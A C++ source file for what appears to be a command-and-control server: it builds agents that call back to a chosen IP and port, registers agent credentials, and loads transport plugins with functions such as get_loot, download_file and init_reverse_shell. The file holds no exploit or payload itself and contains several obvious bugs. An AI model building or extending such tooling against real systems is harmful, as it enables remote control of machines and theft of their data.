#include "server.h"

#ifdef HAVE_ARGP_H
#include <argp.h>
#endif


// TODO: RETHINK THIS WHOLE THING
#ifdef HAVE_ARGP_H
const char *argp_program_version = "libssh server example "
    SSH_STRINGIFY(LIBSSH_VERSION);
const char *argp_program_bug_address = "<libssh@libssh.org>";

/* Program documentation. */
static char doc[] = "libssh -- a Secure Shell protocol implementation";

/* A description of the arguments we accept. */
static char args_doc[] = "BINDADDR";

/* The options we understand. */
static struct argp_option options[] = {
    {
        .name  = "port",
        .key   = 'p',
        .arg   = "PORT",
        .flags = 0,
        .doc   = "Set the port to bind.",
        .group = 0
    },
    {
        .name  = "hostkey",
        .key   = 'k',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the host key.",
        .group = 0
    },
    {
        .name  = "dsakey",
        .key   = 'd',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the dsa key.",
        .group = 0
    },
    {
        .name  = "rsakey",
        .key   = 'r',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the rsa key.",
        .group = 0
    },
    {
        .name  = "verbose",
        .key   = 'v',
        .arg   = NULL,
        .flags = 0,
        .doc   = "Get verbose output.",
        .group = 0
    },
    {
        .name = "agent",
        .key = 'a',
        .arg = "IP:PORT",
        .flags = 0,
        .doc = "Compile an agent which will connect to IP over PORT",
        .group = 0
    },
    {
        .name = "authenticate",
        .key = 'i',
        .arg = "ID:PASS",
        .flags = 0,
        .doc = "Add agent information to the server database",
        .group = 0
    },
    {NULL, 0, 0, 0, NULL, 0}
};

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state) {
  /* Get the input argument from argp_parse, which we
   * know is a pointer to our arguments structure.
   */
    ssh_bind sshbind = (ssh_bind) state->input;
    char *ip;
    char *port;
    char *pass;
    char *id;
    int dbg = 0;
    int halt = 0;
    char buff[256];
    AgentInformationHandler *handler = new AgentInformationHandler();
  
    switch (key) {
        case 'p':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, arg);
            break;
        case 'd':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, arg);
            break;
        case 'k':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, arg);
            break;
        case 'r':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, arg);
            break;
        case 'v':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY_STR, "3");
            break;
        case 'a':
            halt = 1;
            port = strchr(arg, ':') + 1;
            if(port == NULL){
                printf("Improper format: needs to be IP:PORT\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            ip = misc_substring(arg, dbg, strlen(arg));
        
            handler->compile(ip, port);
            free(ip);
            break;
        case 'i':
            halt = 1;
            pass = strchr(arg, ':') + 1;
            if(pass == NULL){
                printf("Improper format: needs to be ID:PASSWORD\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            id = misc_substring(arg, dbg, strlen(arg));

            AgentInformationHandler::register_agent(id, pass);
            sprintf(buff, "Registered agent with %s and %s\n", id, pass);
            free(id);
            break;
        case ARGP_KEY_ARG:
            if (state->arg_num >= 1) {
            /* Too many arguments. */
                argp_usage (state);
            }
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, arg);
            break;
        case ARGP_KEY_END:
            if (state->arg_num < 1) {
                /* Not enough arguments. */
                delete handler;
                if(!halt)
                    argp_usage (state);
                else exit(0);
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

/* Our argp parser. */
static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
#endif /* HAVE_ARGP_H */

/*Global variables and data structures*/
pthread_t thread_array[MAX_CONN];


/*handy little print function for debugging pClientDat structures*/
void print_clientDat(pClientDat str){
    printf("\n\nID: %s\n", str->id);
    printf("Type: %d\n\n\n", str->type);
}

Server::Server(){
    this->sessions = new std::vector<ConnectionInstance *>(0);
    this->shell_queue = new std::queue<ConnectionInstance *>();
    this->logger = new Log();

    int ret;
    char* last;
	char result[4096];
    char dir[4096];
    unsigned long index;
    struct stat st = {0};
    int type = 0;
    int opt = 0;

    if( (this->master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
        perror("Server: Socket Failure");      
    }

    if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
        perror("Server: Setsockopt Failure");
    }

    


    memset(result, 0, sizeof(result));
	memset(dir, 0, sizeof(dir));
	
    // seed random number generator
    srand(time(NULL));

	// gets current file path, so data will be written to correct folder regardless of where execution is called
	readlink( "/proc/self/exe", result, 4096);

	last = strrchr(result, '/');
	index = last - result;
	strncpy(dir, result, index);
	
	ret = chdir(dir);
	if(ret < 0){
		perror("Failed to change directory");
		exit(-1);
	}


    umask(0);

    // initialize base directories
    if (stat("agents", &st) == -1) {
        mkdir("agents", 0755);
        printf("Server: initialized directory 'agents'\n");
    }

    if (stat("out", &st) == -1) {
        mkdir("out", 0755);
        printf("Server: initialized directory 'out'\n");
    }

    if (stat(DATA_FILE, &st) == -1) {
        int fd2 = open(DATA_FILE, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
        printf("Server: initialized agent authentication file\n");
        close(fd2);
    }
}

void Server::add_instance(ConnectionInstance *instance){
    if (instance == nullptr){
        printf("Nullptr instance caught\n");
    } else {
        this->sessions->push_back(instance);
    }
    
}

class Log *Server::get_log(){
    return this->logger;
}

int Server::listen_instance(int index){
    pthread_t thread;
    
    class ConnectionInstance *instance = this->sessions->at(index);
    if(instance == nullptr){
        printf("instance is still nullptr\n");
        return 1;
    }

    // to keep a reference to the thread in memory
    instance->set_thread(thread);
    // pass connection to handler thread
    if(pthread_create(&thread, NULL, instance->handle_connection, instance)){
        printf("Error creating thread\n");
        delete instance;
        return 1;
    }
    
    return 0;
}

int Server::listen_instance(class ConnectionInstance *instance){
    pthread_t thread;
    
    //instance->get_transport()->listen(this->master_socket);
    instance->set_thread(thread);
    // pass connection to handler thread
    if(pthread_create(&thread, NULL, instance->handle_connection, instance)){
        printf("Error creating thread\n");
        delete instance;
        return 1;
    }
    
    return 0;
}

std::queue<ConnectionInstance *> *Server::get_shell_queue(){
    return this->shell_queue;
}

ptransport_t init_transport(void *handle){
    ptransport_t transport = (ptransport_t) malloc(sizeof(transport_t));
    memset(transport, 0, sizeof(transport_t));

    /*transport->send_ok = (int (*)())dlsym(handle, "send_ok");
    if(!transport->send_ok){
        printf("Failed to find function send_ok\n");
        return nullptr;
    }*/

    int (*test)();
    test = (int (*)())dlsym(handle, "send_ok");
    if(test == NULL){
        printf("so we did the big woopsie\n");
    }

    transport->send_err = (int (*)())dlsym(handle, "send_err");
    if(!transport->send_err){
        printf("Failed to find function send_err\n");
        return nullptr;
    }

    transport->listen = (int (*)())dlsym(handle, "listen");
    if(!transport->listen){
        printf("Failed to find function listen\n");
        return nullptr;
    }

    transport->read = (int (*)(char **,int))dlsym(handle, "read");
    if(!transport->read){
        printf("Failed to find function read\n");
        return nullptr;
    }

    transport->write = (int (*)(char*,int))dlsym(handle, "write");
    if(!transport->write){
        printf("Failed to find function write\n");
        return nullptr;
    }

    transport->download_file = (int (*)(char *,int,char*))dlsym(handle, "download_file");
    if(!transport->download_file){
        printf("Failed to find function download_file\n");
        return nullptr;
    }

    transport->get_loot = (int (*)(char*))dlsym(handle, "get_loot");
    if(!transport->get_loot){
        printf("Failed to find function get_loot\n");
        return nullptr;
    }

    transport->upload_file = (int (*)(char*,int))dlsym(handle, "upload_file");
    if(!transport->upload_file){
        printf("Failed to find function upload_file\n");
        return nullptr;
    }

    transport->get_info = (int (*)(char*))dlsym(handle, "get_info");
    if(!transport->get_info){
        printf("Failed to find function get_info\n");
        return nullptr;
    }

    transport->init_reverse_shell = (int (*)(char *))dlsym(handle, "init_reverse_shell");
    if(!transport->init_reverse_shell){
        printf("Failed to find function init_reverse_shell\n");
        return nullptr;
    }

    transport->determine_handler = (int (*)())dlsym(handle, "determine_handler");
    if(!transport->determine_handler){
        printf("Failed to find function determine_handler\n");
        return nullptr;
    }

    transport->make_agent = (int (*)(char*,char*))dlsym(handle, "make_agent");
    if(!transport->make_agent){
        printf("Failed to find optional function make_agent. Ignoring\n");
    }

    transport->init = (int (*)(pClientDat))dlsym(handle, "init");
    if(!transport->make_agent){
        printf("Failed to find function init\n");
        return nullptr;
    }

    transport->end = (int (*)())dlsym(handle, "end");
    if(!transport->make_agent){
        printf("Failed to find function end\n");
        return nullptr;
    }

    return transport;
}


/*Funny enough, this is the main function*/
int main(int argc, char **argv){
    // TODO: UPDATE SIGHANDLERS TO MODERN STUFF

    // initialize variables
    Server *server = new Server();

    // Example load .so transport
    void *handle = dlopen("./shared/ssh_transport.so", RTLD_LAZY);
    if(!handle) {
        printf("failed to load .so file\n");    
        return -1;
    }
    
    int type = *(int *)dlsym(handle, "type");
    if(!type) {
        printf("Failed to find type symbol!\n");
        return 1;
    }
    else printf("Detected type of object: %d\n", type);

    ptransport_t transport;
    class ConnectionInstance *instance;
    void (*entrypoint)();

    switch(type){
        case MODULE:
            printf("Detected module type\n");
            
            entrypoint = (void (*)())dlsym(handle, "entrypoint");
            if (!entrypoint){
                printf("Failed to locate the module's entrypoint function");
                return 1;
            }
            (*entrypoint)();
            break;
        case TRANSPORT:
            printf("Detected transport type\n");
            transport = (ptransport_t)dlsym(handle, "transport_api");
            if(!transport) {
                printf("Failed to find transport api\n"); 
                return 1;
            }
            instance = new ConnectionInstance(server);
            instance->set_transport(transport);
            server->add_instance(instance);
            server->listen_instance(0);
            break;

        default:
            printf("Unknown type: %d\n", type);
            return 1;

    }
    
    // initialize the controller socket
    //ConnectionInstance *instance = new ConnectionInstance(server);
    //ServerTransport *def_transport = new Ssh_Transport(instance);

    //instance->set_transport(def_transport);
    //server->add_instance(instance);
    //server->listen_instance(0);
    

    
    // accept connections
    // TODO: FIX THIS SO LOOP BIND WORKS LOL
  
    while(1){
        sleep(1);
    }
    
    printf("Server: Terminated successfully\n");
    return 0;
}
